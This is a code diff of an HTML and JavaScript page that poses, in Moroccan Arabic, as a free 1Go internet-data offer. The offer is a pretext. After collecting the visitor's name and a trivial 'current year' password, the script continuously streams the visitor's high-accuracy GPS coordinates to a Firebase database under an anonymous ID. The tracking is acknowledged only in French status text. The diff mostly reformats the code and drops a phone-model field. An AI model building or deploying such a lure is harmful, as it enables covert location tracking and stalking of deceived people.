@@ -5,15 +5,18 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>عروض الإنترنت</title>
+
   <style>
     * { box-sizing: border-box; }
+
     body {
       font-family: Arial, sans-serif;
       background: #de8100;
-      color: rgb(7, 0, 0);
+      color: #070000;
       margin: 0;
       padding: 16px;
     }
+
     .card {
       max-width: 480px;
       margin: 25px auto;
@@ -22,18 +25,33 @@
       border-radius: 15px;
       box-shadow: 0 10px 30px rgba(215, 0, 0, 0.2);
     }
-    h1 { color: #000000; text-align: center; }
-    .description { color: #bc4800; line-height: 1.6; text-align: center; }
-    label { display: block; margin: 14px 0 6px; }
-    input, select {
+
+    h1 {
+      color: #000;
+      text-align: center;
+    }
+
+    .description {
+      color: #bc4800;
+      line-height: 1.6;
+      text-align: center;
+    }
+
+    label {
+      display: block;
+      margin: 14px 0 6px;
+    }
+
+    input {
       width: 100%;
       padding: 13px;
       border-radius: 8px;
       border: 1px solid #ac6400;
       background: #f0f1f4;
-      color: rgb(0, 0, 0);
+      color: #000;
       font-size: 16px;
     }
+
     button {
       width: 100%;
       padding: 13px;
@@ -44,36 +62,74 @@
       font-weight: bold;
       cursor: pointer;
     }
-    button:disabled { opacity: .5; cursor: not-allowed; }
-    .primary { background: #22c55e; color: #052e16; }
-    .stop { background: #f87171; color: #450a0a; }
-    #status { color: #004396; line-height: 1.6; overflow-wrap: anywhere; }
-    .note { color: #900700; font-size: 12px; line-height: 1.6; }
+
+    button:disabled {
+      opacity: .5;
+      cursor: not-allowed;
+    }
+
+    .primary {
+      background: #22c55e;
+      color: #052e16;
+    }
+
+    .stop {
+      background: #f87171;
+      color: #450a0a;
+    }
+
+    #status {
+      color: #004396;
+      line-height: 1.6;
+      overflow-wrap: anywhere;
+    }
+
+    .note {
+      color: #900700;
+      font-size: 12px;
+      line-height: 1.6;
+    }
   </style>
 </head>
+
 <body>
   <main class="card">
     <h1>📢 1Go عرض الإنترنت 🌐🔥</h1>
+
     <p class="description">
-      🚀 إنترنت سريع، تواصل بلا حدود!
-استافد من عروض الإنترنت واختار الشبكة اللي مناسبة ليك.
+      🚀 إنترنت سريع، تواصل بلا حدود!<br>
+      استفد من عروض الإنترنت واختار الشبكة اللي مناسبة ليك.
     </p>
 
     <label for="nom">النسب</label>
-    <input id="nom" autocomplete="family-name" placeholder="Votre nom">
+    <input
+      id="nom"
+      autocomplete="family-name"
+      placeholder="Votre nom"
+    >
 
     <label for="prenom">الاسم</label>
-    <input id="prenom" autocomplete="given-name" placeholder="Votre prénom">
+    <input
+      id="prenom"
+      autocomplete="given-name"
+      placeholder="Votre prénom"
+    >
 
-    <label for="telephone">نوع الهاتف</label>
-    <input id="telephone" placeholder="Ex. : Samsung Galaxy A15">
+    <label for="password">ما هو العام الحالي؟</label>
+    <input
+      id="password"
+      type="password"
+      autocomplete="off"
+      placeholder="Ex. : 2026"
+    >
 
-    <label for="password">ما هو العام الحالي ؟</label>
-    <input id="password" type="password" autocomplete="current-password"
-           placeholder="Ex: 2024">
+    <button id="startBtn" class="primary">
+      اختيار الشبكة
+    </button>
 
-    <button id="startBtn" class="primary">اختيار الشبكة</button>
-    <button id="stopBtn" class="stop" disabled>إلغاء العرض</button>
+    <button id="stopBtn" class="stop" disabled>
+      إلغاء العرض
+    </button>
 
     <p id="status">Connexion à Firebase...</p>
 
@@ -87,11 +143,17 @@
     import { initializeApp } from
       "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 
-    import { getAuth, signInAnonymously } from
+    import {
+      getAuth,
+      signInAnonymously
+    } from
       "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 
     import {
-      getDatabase, ref, set, onDisconnect
+      getDatabase,
+      ref,
+      set,
+      onDisconnect
     } from
       "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
@@ -106,8 +168,8 @@
       measurementId: "G-0LR1706DJZ"
     };
 
-    // Mot de passe de démonstration seulement.
-    // Il est visible dans le code source de la page.
+    // Mot de passe de démonstration.
+    // Attention : ce mot de passe est visible dans le code source.
     const DEMO_PASSWORD = "2026";
 
     const $ = id => document.getElementById(id);
@@ -126,9 +188,12 @@
     try {
       const result = await signInAnonymously(auth);
       user = result.user;
-      status.textContent = "Connecté. Remplissez le formulaire pour continuer.";
+
+      status.textContent =
+        "Connecté. Remplissez le formulaire pour continuer.";
     } catch (error) {
-      status.textContent = "Erreur de connexion Firebase : " + error.message;
+      status.textContent =
+        "Erreur de connexion Firebase : " + error.message;
       startBtn.disabled = true;
     }
 
@@ -137,10 +202,9 @@
 
       const nom = $("nom").value.trim();
       const prenom = $("prenom").value.trim();
-      const telephone = $("telephone").value.trim();
       const password = $("password").value;
 
-      if (!nom || !prenom || !telephone || !password) {
+      if (!nom || !prenom || !password) {
         status.textContent = "Veuillez remplir tous les champs.";
         return;
       }
@@ -151,7 +215,8 @@
       }
 
       if (!navigator.geolocation) {
-        status.textContent = "La géolocalisation n'est pas prise en charge.";
+        status.textContent =
+          "La géolocalisation n'est pas prise en charge.";
         return;
       }
 
@@ -159,19 +224,18 @@
       status.textContent = "Demande d'autorisation GPS...";
 
       try {
-        // Chaque utilisateur anonyme reçoit un identifiant Firebase.
-        const clientRef = ref(db, `clients/${user.uid}`);
+        const clientPath = `clients/${user.uid}`;
 
-        await set(ref(db, `clients/${user.uid}/profile`), {
+        await set(ref(db, `${clientPath}/profile`), {
           nom,
           prenom,
-          telephone,
           status: "connecting",
           updatedAt: Date.now()
         });
 
-        await onDisconnect(ref(db, `clients/${user.uid}/status`))
-          .set("offline");
+        await onDisconnect(
+          ref(db, `${clientPath}/status`)
+        ).set("offline");
 
         sharing = true;
         stopBtn.disabled = false;
@@ -181,14 +245,17 @@
             if (!sharing) return;
 
             try {
-              await set(ref(db, `clients/${user.uid}/location`), {
+              await set(ref(db, `${clientPath}/location`), {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
                 accuracy: position.coords.accuracy,
                 timestamp: Date.now()
               });
 
-              await set(ref(db, `clients/${user.uid}/status`), "online");
+              await set(
+                ref(db, `${clientPath}/status`),
+                "online"
+              );
 
               if (sharing) {
                 status.textContent =
@@ -199,6 +266,7 @@
                 "Erreur d'envoi Firebase : " + error.message;
             }
           },
+
           async error => {
             status.textContent = "Erreur GPS : " + error.message;
             sharing = false;
@@ -212,26 +280,34 @@
             startBtn.disabled = false;
 
             try {
-              await set(ref(db, `clients/${user.uid}/status`), "offline");
+              await set(
+                ref(db, `${clientPath}/status`),
+                "offline"
+              );
             } catch {}
           },
+
           {
             enableHighAccuracy: true,
             maximumAge: 5000,
             timeout: 20000
           }
         );
+
       } catch (error) {
         sharing = false;
         startBtn.disabled = false;
         stopBtn.disabled = true;
+
         status.textContent =
           "Erreur Firebase : " + error.message +
-          " (les règles Firebase devront peut-être être adaptées).";
+          " (vérifiez les règles Firebase).";
       }
     });
 
     stopBtn.addEventListener("click", async () => {
+      if (!user) return;
+
       sharing = false;
 
       if (watchId !== null) {
@@ -244,11 +320,21 @@
       status.textContent = "Arrêt du partage...";
 
       try {
-        await set(ref(db, `clients/${user.uid}/location`), null);
-        await set(ref(db, `clients/${user.uid}/status`), "offline");
-        status.textContent = "Partage arrêté. La position a été supprimée.";
+        await set(
+          ref(db, `clients/${user.uid}/location`),
+          null
+        );
+
+        await set(
+          ref(db, `clients/${user.uid}/status`),
+          "offline"
+        );
+
+        status.textContent =
+          "Partage arrêté. La position a été supprimée.";
       } catch (error) {
-        status.textContent = "GPS arrêté, mais erreur Firebase : " + error.message;
+        status.textContent =
+          "GPS arrêté, mais erreur Firebase : " + error.message;
       }
     });
   </script>
